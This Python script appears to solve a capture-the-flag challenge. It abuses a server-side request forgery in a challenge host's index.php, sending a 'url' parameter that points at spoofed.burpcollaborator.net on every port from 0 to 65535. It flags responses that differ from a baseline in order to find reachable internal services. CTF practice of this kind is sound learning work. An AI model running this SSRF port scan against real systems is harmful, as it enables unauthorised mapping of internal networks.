import aiohttp
import asyncio
import requests

data = {'url' : 'http://spoofed.burpcollaborator.net:0'}
response = requests.post('http://host1.metaproblems.com:5730/index.php', data=data, verify=False)
by_itself = response.text
data = {'url' : 'http://spoofed.burpcollaborator.net:0'}
by_itself = requests.post('http://host1.metaproblems.com:5730/index.php', data=data, verify=False).text

done_count = 0

async def make_req(port, session):
    global done_count

    data = {'url' : 'http://spoofed.burpcollaborator.net:{}'.format(port)}

    async with session.post(url='http://host1.metaproblems.com:5730/index.php', data=data) as response:

        resp_text = await response.text()
        if (resp_text.strip() != by_itself.strip()):
            print('------------------------- PORT {} --------------------------'.format(port))
            print(resp_text)

    done_count += 1
    if done_count % 1000 == 0:
        print(done_count)

async def main():
    async with aiohttp.ClientSession() as session:
        await asyncio.gather(*[make_req(i, session) for i in range(65536)])

loop = asyncio.get_event_loop()
loop.run_until_complete(main())
